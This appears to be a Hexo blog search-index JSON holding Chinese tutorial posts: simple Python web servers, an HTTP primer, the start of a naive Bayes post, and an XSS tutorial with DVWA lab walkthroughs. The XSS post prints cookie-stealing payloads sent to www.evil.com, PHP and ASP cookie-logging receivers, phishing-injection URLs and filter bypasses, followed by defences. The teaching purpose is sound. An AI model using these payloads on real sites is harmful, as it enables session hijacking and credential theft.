{"meta":{"title":"fishni","subtitle":"","description":"","author":"John Doe","url":"https://fishni.github.io","root":"/"},"pages":[{"title":"关于","date":"2020-04-06T10:04:14.332Z","updated":"2020-04-06T10:04:14.332Z","comments":true,"path":"about/index.html","permalink":"https://fishni.github.io/about/index.html","excerpt":"","text":"I’m fishmouse! 本博文是自身学习的一种记录，予己，希望能予以！"},{"title":"所有分类","date":"2020-03-30T05:12:13.734Z","updated":"2020-03-30T05:12:13.734Z","comments":true,"path":"categories/index.html","permalink":"https://fishni.github.io/categories/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2020-03-30T05:13:30.921Z","updated":"2020-03-30T05:13:30.921Z","comments":true,"path":"tags/index.html","permalink":"https://fishni.github.io/tags/index.html","excerpt":"","text":""},{"title":"友邻","date":"2020-03-30T05:26:40.217Z","updated":"2020-03-30T05:26:40.217Z","comments":true,"path":"friends/index.html","permalink":"https://fishni.github.io/friends/index.html","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。"}],"posts":[{"title":"【python-Web服务器】1.2 python-Web静态服务器-2-显示需要的页面","slug":"1.3 python-Web静态服务器-2-显示需要的页面","date":"2020-04-05T16:00:00.000Z","updated":"2020-04-06T09:46:13.582Z","comments":true,"path":"2020/04/06/1.3 python-Web静态服务器-2-显示需要的页面/","link":"","permalink":"https://fishni.github.io/2020/04/06/1.3%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-2-%E6%98%BE%E7%A4%BA%E9%9C%80%E8%A6%81%E7%9A%84%E9%A1%B5%E9%9D%A2/","excerpt":"本文使用python写个可以显示需要页面的Web静态服务器。","text":"本文使用python写个可以显示需要页面的Web静态服务器。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# coding: utf-8import socketfrom multiprocessing import Processimport reHTML_ROOT_DIR = \"./html\"def handle_client(client_socket): \"\"\"处理客户端请求\"\"\" # 获取客户端数据 request_data = client_socket.recv(1024) print(\"request data:\",request_data) # 处理请求数据 request_lines = request_data.splitlines() for line in request_lines: print(line) # \"GET / HTTP/1.1\" request_start_line = request_lines[0] file_name = re.match(r\"\\w+ +(/[^ ]*)\",request_start_line.decode(\"utf-8\")).group(1) if \"/\" == file_name: file_name= \"/index.html\" # 打开文件 try: file = open(HTML_ROOT_DIR+file_name,\"rb\") except IOError: # 构造响应数据 response_start_line = \"HTTP/1.1 404 Not Found\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = \"file is not found!\" else: file_data = file.read() file.close() # 构造响应数据 response_start_line = \"HTTP/1.1 200 0k\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = file_data.decode(\"utf-8\") response = response_start_line + response_headers+ \"\\r\\n\"+ response_body print(\"response:\",response) # 向客户端发送数据 client_socket.send(bytes(response,\"utf-8\")) # 关闭客户端连接 client_socket.close()if __name__ == \"__main__\": server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) server_socket.bind((\"\",8000)) server_socket.listen(128) while True: client_socket, client_address = server_socket.accept() print(\"[%s,%s]用户连接上了\"%client_address) handle_client_process = Process(target=handle_client, args=(client_socket,)) handle_client_process.start() client_socket.close()","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"}]},{"title":"【python-Web服务器】1.2 python-Web静态服务器-1-显示固定的页面","slug":"1.2 python-Web静态服务器-1-显示固定的页面","date":"2020-04-05T16:00:00.000Z","updated":"2020-04-06T09:45:04.116Z","comments":true,"path":"2020/04/06/1.2 python-Web静态服务器-1-显示固定的页面/","link":"","permalink":"https://fishni.github.io/2020/04/06/1.2%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1-%E6%98%BE%E7%A4%BA%E5%9B%BA%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2/","excerpt":"本文使用python写个简单的Web静态服务器","text":"本文使用python写个简单的Web静态服务器 12345678910111213141516171819202122232425262728293031323334# coding: utf-8import socketfrom multiprocessing import ProcessHTML_ROOT_DIR = \"\"def handle_client(client_socket): \"\"\"处理客户端请求\"\"\" # 获取客户端数据 request_data = client_socket.recv(1024) print(\"request data:\",request_data) # 构造响应数据 response_start_line = \"HTTP/1.1 200 0k\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = \"hello world\" response = response_start_line + response_headers+ \"\\r\\n\"+ response_body print(\"response:\",response) # 向客户端发送数据 client_socket.send(bytes(response,\"utf-8\")) # 关闭客户端连接 client_socket.close()if __name__ == \"__main__\": server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server_socket.bind((\"\",8000)) server_socket.listen(128) while True: client_socket, client_address = server_socket.accept() print(\"[%s,%s]用户连接上了\"%client_address) handle_client_process = Process(target=handle_client, args=(client_socket,)) handle_client_process.start() client_socket.close() 服务端 客户端","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"}]},{"title":"【python-Web服务器】1.1 HTTP协议简介","slug":"1.1 HTTP协议简介","date":"2020-04-05T16:00:00.000Z","updated":"2020-04-06T09:10:19.915Z","comments":true,"path":"2020/04/06/1.1 HTTP协议简介/","link":"","permalink":"https://fishni.github.io/2020/04/06/1.1%20HTTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B/","excerpt":"本文主要结合浏览器开发者工具理解HTTP协议，分析浏览器与服务器之间的请求和响应。","text":"本文主要结合浏览器开发者工具理解HTTP协议，分析浏览器与服务器之间的请求和响应。 0x01 使用谷歌/火狐浏览器分析 在Web应用中，服务器把网页传给浏览器，实际上就是把网页的HTML代码发送给浏览器，让浏览器显示出来。而浏览器和服务器之间的传输协议是HTTP,所以： HTML是一种用来定义网页的文本 HTTP是在网络上传输HTML的协议，用于浏览器和服务器的通信 Chrome浏览器提供了完整的调试工具，非常适合Web开发。在Chrome浏览器（更多工具–&gt;开发者工具）或者Windows下F12说明 Elements显示网页的结构 Network显示浏览器和服务器的通信 点击Network，确保第一个小红灯亮着，Chrome就会记录所有浏览器和服务器之间的通信： 0x02 HTTP协议分析当在地址栏输入www.baidu.com时,浏览器显示百度首页。在这个过 程中，浏览器都干了哪些事情呢？通过Network的记录，我们就可以知道。 在Network中，找到www.baidu.com那条记录，点击，右侧将显示Request Headers，点击右侧的view-source，我们就可以看到浏览器发给百度服务器的请求： 2.1 浏览器请求 说明：（最主要的头两⾏分析如下） 第⼀⾏GET / HTTP/1.1：GET表示⼀个读取请求，将从服务器获得⽹⻚数据，/表示URL的路径，URL 总是以/开头，/就表示⾸⻚，最后的HTTP/1.1指示采⽤的HTTP协议版本是 1.1。⽬前HTTP协议的版本就是1.1，但是⼤部分服务器也⽀持1.0版本，主 要区别在于1.1版本允许多个HTTP请求复⽤⼀个TCP连接，以加快传输速 度。 从第⼆⾏开始，每⼀⾏都类似于Xxx: abcdefg：Host: www.baidu.com，表示请求的域名是www.baidu.com。如果⼀台服务器有多个⽹站，服务器就需 要通过Host来区分浏览器请求的是哪个⽹站。 2.2 服务器响应继续找到Response Headers，点击view-source，显示服务器返回的原始响应数据： HTTP响应分为Header和Body两部分（Body是可选项），我们在Network中 看到的Header最重要的⼏⾏如下： HTTP/1.1 200 OK：200表示⼀个成功的响应，后⾯的OK是说明。 如果返回的不是200，那么往往有其他的功能，例如 失败的响应有404 Not Found：网⻚不存在 500 Internal Server Error：服务器内部出错 等等… Content-Type:text/html：Content-Type指示响应的内容，这⾥是text/html表示HTML⽹⻚。 请注意，浏览器就是依靠Content-Type来判断响应的内容是网页还是图⽚，是视频还是⾳乐。浏览器并不靠URL来判断响应的内容，所以，即使URL是 http://www.baidu.com/meimei.jpg，它也不⼀定就是图⽚。 HTTP响应的Body就是HTML源码，右键查看网页源码，就是查看响应的body 浏览器解析过程 当浏览器读取到百度⾸⻚的HTML源码后，它会解析HTML，显示⻚⾯，然后，根据HTML⾥⾯的各种链接，再发送HTTP请求给百度服务器，拿到相应的图⽚、视频、Flash、JavaScript脚本、CSS等各种资源，最终显示出⼀个完整的⻚⾯。所以我们在Network下⾯能看到很多额外的HTTP请求 0x03 总结3.1 HTTP请求步骤1：浏览器⾸先向服务器发送HTTP请求，请求包括： ⽅法：GET还是POST，GET仅请求资源，POST会附带⽤户数据； 路径：/full/url/path； 域名：由Host头指定； 以及其他相关的Header； 如果是POST，那么请求还包括⼀个Body，包含⽤户数据 步骤2：服务器向浏览器返回HTTP响应，响应包括： 响应代码：200表示成功，3xx表示重定向，4xx表示客户端发送的请求 有错误，5xx表示服务器端处理时发⽣了错误； 响应类型：由Content-Type指定； 以及其他相关的Header； 通常服务器的HTTP响应会携带内容，也就是有⼀个Body，包含响应的 内容，⽹⻚的HTML源码就在Body中。 步骤3：如果浏览器还需要继续向服务器请求其他资源， ⽐如图⽚，就再次发出HTTP请求，重复步骤1、2 Web采⽤的HTTP协议采⽤了⾮常简单的请求-响应模式，从⽽⼤⼤简化 了开发。当我们编写⼀个⻚⾯时，我们只需要在HTTP请求中把HTML 发送出去，不需要考虑如何附带图⽚、视频等，浏览器如果需要请求图 ⽚和视频，它会发送另⼀个HTTP请求，因此，⼀个HTTP请求只处理 ⼀个资源(此时就可以理解为TCP协议中的短连接，每个链接只获取⼀ 个资源，如需要多个就需要建⽴多个链接) 3.2 HTTP格式每个HTTP请求和响应都遵循相同的格式，⼀个HTTP包含Header和Body两 部分，其中Body是可选的。HTTP协议是⼀种⽂本协议，所以，它的格式也⾮常简单 HTTP GET请求的格式：1234GET &#x2F;path HTTP&#x2F;1.1 Header1: Value1 Header2: Value2 Header3: Value3 每个Header⼀⾏⼀个，换⾏符是\\r\\n HTTP POST请求的格式：123456POST &#x2F;path HTTP&#x2F;1.1Header1: Value1Header2: Value2Header3: Value3body data goes here... 当遇到连续两个\\r\\n时，Header部分结束，后⾯的数据全部是Body HTTP响应的格式：123456200 OK Header1: Value1 Header2: Value2 Header3: Value3 body data goes here... HTTP响应如果包含body，也是通过\\r\\n\\r\\n来分隔的 请再次注意，Body的数据类型由Content-Type头来确定，如果是⽹⻚，Body就是⽂本，如果是图⽚，Body就是图⽚的⼆进制数据。 当存在Content-Encoding时，Body数据是被压缩的，最常⻅的压缩⽅式是gzip，所以，看到Content-Encoding:gzip时，需要将Body数据先解压缩，才能得到真正的数据。压缩的⽬的在于减少Body的⼤⼩，加快⽹络传输。","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://fishni.github.io/tags/HTTP/"},{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"}]},{"title":"【XSS（一）】1.1 XSS介绍与原理","slug":"1.1 XSS介绍与原理","date":"2020-04-05T16:00:00.000Z","updated":"2020-04-06T04:41:44.135Z","comments":true,"path":"2020/04/06/1.1 XSS介绍与原理/","link":"","permalink":"https://fishni.github.io/2020/04/06/1.1%20XSS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%8E%9F%E7%90%86/","excerpt":"本文主要整理了XSS相关知识，XSS类别、利用、危害以及简单的实例分析。","text":"本文主要整理了XSS相关知识，XSS类别、利用、危害以及简单的实例分析。 0x01 基础知识1.1 XSS简介跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击 关键点： 目标网站的目标用户 浏览器 不被预期的： 攻击者在输入时提交了可控的脚本内容，然后在输出时被浏览器解析执行 “跨站脚本”重点是脚本：XSS在攻击时会嵌入一段远程的第三方域上的脚本资源。 总之，要想尽一切办法将你的脚本内容在目标网站中目标用户的浏览器上解释执行 1.2 XSS分类反射型 反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。 反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 服务器端代码： 1234567 &lt;?php // Is there any input? if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; &#125; ?&gt; 可以看到，代码直接引用了 name 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。 存储型 持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。 此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。 服务器端代码： 123456789101112131415&lt;?php if( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); // Sanitize name input $name = mysql_real_escape_string( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); //mysql_close(); &#125;?&gt; 代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。 DOM型 传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。 HTML 代码： 1234567891011&lt;html&gt; &lt;head&gt; &lt;title&gt;DOM-XSS test&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var a=document.URL; document.write(a.substring(a.indexOf(\"a=\")+2,a.length)); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 将代码保存在 domXSS.html 中，浏览器访问： 1http:&#x2F;&#x2F;127.0.0.1&#x2F;domXSS.html?a&#x3D;&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt; DOM型与前两者的差别是，只在客户端进行解析，不需要服务器的解析响应 1.3 XSS 利用方式Cookies 窃取 攻击者可以使用以下代码获取客户端的 Cookies 信息 ： 12345&lt;script&gt;document.location=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookienew Image().src=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookie&lt;/script&gt;&lt;img src=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookie&gt;&lt;/img&gt; 在远程服务器上，有一个接受和记录 Cookies 信息的文件，示例如下： 123456789&lt;% msg&#x3D;Request.ServerVariables(&quot;QUERY_STRING&quot;) testfile&#x3D;Server.MapPath(&quot;cookie.txt&quot;) set fs&#x3D;server.CreateObject(&quot;Scripting.filesystemobject&quot;) set thisfile&#x3D;fs.OpenTextFile(testfile,8,True,0) thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;) thisfile.close set fs&#x3D;nothing%&gt; 123456&lt;?php$cookie = $_GET['cookie'];$log = fopen(\"cookie.txt\", \"a\");fwrite($log, $cookie . \"\\n\");fclose($log);?&gt; 攻击者在获取到 Cookies 之后，通过修改本机浏览器的 Cookies，即可登录受害者的账户。 会话劫持 由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。 如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。 比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XMLHTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。 钓鱼 重定向钓鱼 把当前页面重定向到一个钓鱼页面。 1http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&quot;&#39;&gt;&lt;script&gt;document.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&quot;&lt;&#x2F;script&gt; HTML 注入式钓鱼 使用 XSS 漏洞注入 HTML 或 JavaScript 代码到页面中。 1http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&quot;&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div style&#x3D;&quot;text-align:center;&quot;&gt;&lt;form Method&#x3D;&quot;POST&quot; Action&#x3D;&quot;phishing.php&quot; Name&#x3D;&quot;form&quot;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;Login:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;login&quot; &#x2F;&gt;&lt;br &#x2F;&gt;Password:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;Password&quot; type&#x3D;&quot;password&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;Valid&quot; value&#x3D;&quot;Ok&quot; type&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 该段代码会在正常页面中嵌入一个 Form 表单。 iframe 钓鱼 这种方式是通过&lt;iframe&gt;标签嵌入远程域的一个页面实施钓鱼。 1http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&#39;&gt;&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&quot; height&#x3D;&quot;100%&quot; width&#x3D;&quot;100%&quot;&lt;&#x2F;iframe&gt; Flash 钓鱼 将构造好的 Flash 文件传入服务器，在目标网站用 &lt;object&gt; 或 &lt;embed&gt; 标签引用即可。 高级钓鱼技术 注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。 网页挂马 一般都是通过篡改网页的方式来实现的，如在 XSS 中使用 &lt;iframe&gt; 标签 DOS 与 DDOS¶注入恶意 JavaScript 代码，可能会引起一些拒绝服务攻击。 XSS 蠕虫 ¶通过精心构造的 XSS 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。 Self-XSS 变废为宝的场景 ¶Self-XSS 顾名思义，就是一个具有 XSS 漏洞的点只能由攻击者本身触发，即自己打自己的攻击。比如个人隐私的输入点存在 XSS。但是由于这个隐私信息只能由用户本人查看也就无法用于攻击其他人。这类漏洞通常危害很小，显得有些鸡肋。但是在一些具体的场景下，结合其他漏洞（比如 CSRF ）就能将 Self-XSS 转变为具有危害的漏洞。下面将总结一些常见可利用 Self-XSS 的场景。 登录登出存在 CSRF，个人信息存在 Self-XSS，第三方登录 这种场景一般的利用流程是首先攻击者在个人信息 XSS 点注入 Payload，然后攻击者制造一个恶意页面诱导受害者访问，恶意页面执行以下操作： 恶意页面执行利用 CSRF 让受害者登录攻击者的个人信息位置，触发 XSS payload JavaScript Payload 生成 &lt;iframe&gt; 标签，并在框架内执行以下这些操作 让受害者登出攻击者的账号 然后使得受害者通过 CSRF 登录到自己的账户个人信息界面 攻击者从页面提取 CSRF Token 然后可以使用 CSRF Token 提交修改用户的个人信息 这种攻击流程需要注意几个地方：第三步登录是不需要用户交互的，利用 Google Sign In 等非密码登录方式登录；X-Frame-Options 需要被设置为同源（该页面可以在相同域名页面的 iframe 中展示 ） 登录存在 CSRF，账户信息存在 Self-XSS，OAUTH 认证 让用户退出账户页面，但是不退出 OAUTH 的授权页面，这是为了保证用户能重新登录其账户页面 让用户登录我们的账户页面出现 XSS，利用 使用 &lt;iframe&gt; 标签等执行恶意代码 登录回他们各自的账户，但是我们的 XSS 已经窃取到 Session 1.4 正则表达式规则 以一个网上商城应用 Magento 中的过滤类 Mage_Core_Model_Input_Filter_MaliciousCode 为例，部分代码如下： 1234567891011121314protected $_expressions = array( '/(\\/\\*.*\\*\\/)/Us', '/(\\t)/', '/(javascript\\s*:)/Usi', '/(@import)/Usi', '/style=[^&lt;]*((expression\\s*?\\([^&lt;]*?\\))|(behavior\\s*:))[^&lt;]*(?=\\&gt;)/Uis', '/(ondblclick|onclick|onkeydown|onkeypress|onkeyup|onmousedown|onmousemove|onmouseout|onmouseover|onmouseup|onload|onunload|onerror)=[^&lt;]*(?=\\&gt;)/Uis', '/&lt;\\/?(script|meta|link|frame|iframe).*&gt;/Uis', '/src=[^&lt;]*base64[^&lt;]*(?=\\&gt;)/Uis',);function filter($value) &#123; return preg_replace($this-&gt;_expressions, '', $value);&#125; 数组 $_expressions 中包含一系列用于过滤的正则表达式，然后通过使用 preg_replace 函数进行恶意代码的过滤。所以当尝试输入 &lt;script&gt;foo&lt;/script&gt; 时，两个标签都会被移除而只剩下 foo。 0x02 简单实例分析以下三个类型的实例，环境为DVWA平台，系统为windows 2.1 反射型XSS-Low等级 先利用alert测试是否存在xss 出现弹窗，说明存在xss漏洞 源码分析 1234567891011&lt;?phpheader (\"X-XSS-Protection: 0\");// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; 通过源码，观察，直接使用name参数，并未进行任何过滤和检查，故存在xss漏洞 编写PHP文档获取页面的cookie： 12345&lt;?php$cookie=$_GET['cookie'];file_put_contents('cookie.txt',$cookie);?&gt; 编写js代码将页面的cookie发送到cookie.php中 当在火狐浏览器中在，以下位置输入 1&lt;script&gt;document.location='http://127.0.0.1/cookie.php?cookie='+document.cookie&lt;/script&gt; 并点击提交，页面跳转，说明执行了js代码 1 跳转至下页面，并打开cookie.txt 如上图，表示成功拿到cookie，也就可以通过cookie登陆dvwa js代码分析： document.location [document 对象] :该对象是window和frames对象的一个属性,是显示于窗口或框架内的一个文档 document.location 包含 href 属性，直接取值赋值时相当于 document.location.href。document.location.href 当前页面完整 URL 2.2 反射型XSS-Medium等级 先利用alert进行弹窗测试 发现页面没有反应，有可能是被过滤了，浏览器虽然会过滤·&lt;script&gt;标签关键字，但是只过滤一次，所以可以想办法绕过 绕过1： 通过构造两个标签，即嵌套 出现弹窗，说明存xss 绕过2：也可以大小写混写进行绕过 出现弹窗，说明存在xss 然后利用js代码获取cookie,成功拿到cookie 源代码分析 1234567891011121314&lt;?phpheader (\"X-XSS-Protection: 0\");// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; str_replace()对&lt;script&gt;进行了过滤‘ 2.3 反射型XSS-High等级 还是先利用弹窗测试是否存在xss,像low和medium等级那样操作发现页面并没有出现弹窗。 接下来我们换个标签，img标签和iframe标签（在一个HTML中嵌入另一个HTML） Img：&lt;img src=x onerror=alert(1)&gt; Iframe: &lt;iframe onload=alert(1)&gt; 两个都成功的出现弹窗 源代码分析 1234567891011121314&lt;?phpheader (\"X-XSS-Protection: 0\");// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; 利用preg_replace()正则表达过滤掉所有形式的&lt;script&gt; 观察下面反射型xss-impossible等级代码 123456789101112131415 &lt;?php // Is there any input? if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\"; &#125; // Generate Anti-CSRF tokengenerateSessionToken();?&gt; 代码采用了Anti-CSRF token机制 htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。 预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 “ ‘ （单引号）成为 ‘ &lt; （小于）成为 &lt; &gt; （大于）成为 &gt; 0x03 防范措施3.1 HttpOnly 防止劫取 Cookie 攻击者可以通过注入恶意脚本获取用户的 Cookie 信息。通常 Cookie 中都包含了用户的登录凭证信息，攻击者在获取到 Cookie 之后，则可以发起 Cookie 劫持攻击。所以，严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。 3.2 用户端输入检查 对于用户的任何输入要进行检查、过滤和转义。 建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码。 HTML转义：对用户输入的内容进行HTML转义，转义后可以确保用户输入的内容在浏览器中作为文本显示，而不是作为代码解析。 一些前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 &lt;，&gt;，script，防止 XSS 攻击： 12345678910&#x2F;&#x2F; vuejs 中的 decodingMap&#x2F;&#x2F; 在 vuejs 中，如果输入带 script 标签的内容，会直接过滤掉const decodingMap &#x3D; &#123; &#39;&lt;&#39;: &#39;&lt;&#39;, &#39;&gt;&#39;: &#39;&gt;&#39;, &#39;&quot;&#39;: &#39;&quot;&#39;, &#39;&amp;&#39;: &#39;&amp;&#39;, &#39; &#39;: &#39;\\n&#39;&#125; 3.3 服务端输出检查 用户的输入会存在问题，服务端的输出也会存在问题。一般来说，除富文本的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"XSS漏洞原理及利用","slug":"网络安全/XSS漏洞原理及利用","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/XSS%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://fishni.github.io/tags/PHP/"},{"name":"XSS","slug":"XSS","permalink":"https://fishni.github.io/tags/XSS/"}]},{"title":"【机器学习算法】鸢尾花数据集GaussianNB分类预测","slug":"鸢尾花数据集GaussianNB分类预测","date":"2020-04-04T16:00:00.000Z","updated":"2020-04-05T05:29:41.655Z","comments":true,"path":"2020/04/05/鸢尾花数据集GaussianNB分类预测/","link":"","permalink":"https://fishni.github.io/2020/04/05/%E9%B8%A2%E5%B0%BE%E8%8A%B1%E6%95%B0%E6%8D%AE%E9%9B%86GaussianNB%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/","excerpt":"本文主要内容 UC Irvine具有用于存储各种数据的大型存储库。 本文使用鸢尾花数据集（https://archive.ics.uci.edu/ml/datasets/Iris）进行实验。 为分类任务实施朴素贝叶斯分类器。 这项试验，随机抽取70％的实例进行训练，其余的则进行测试。 重复试验10次并计算平均准确度。 由于特征是连续变量，因此您可能需要在概率计算中使用高斯模型。","text":"本文主要内容 UC Irvine具有用于存储各种数据的大型存储库。 本文使用鸢尾花数据集（https://archive.ics.uci.edu/ml/datasets/Iris）进行实验。 为分类任务实施朴素贝叶斯分类器。 这项试验，随机抽取70％的实例进行训练，其余的则进行测试。 重复试验10次并计算平均准确度。 由于特征是连续变量，因此您可能需要在概率计算中使用高斯模型。 0x01 实验流程1.1 加载鸢尾花数据集 